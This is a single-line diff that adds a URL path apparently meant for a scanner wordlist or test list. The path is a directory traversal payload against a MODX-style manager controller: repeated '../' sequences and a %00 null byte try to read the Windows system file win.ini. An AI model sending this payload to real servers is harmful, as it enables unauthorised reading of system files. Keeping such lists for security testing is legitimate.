@@ -1,0 +1,1 @@
+/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../windows/win.ini%00
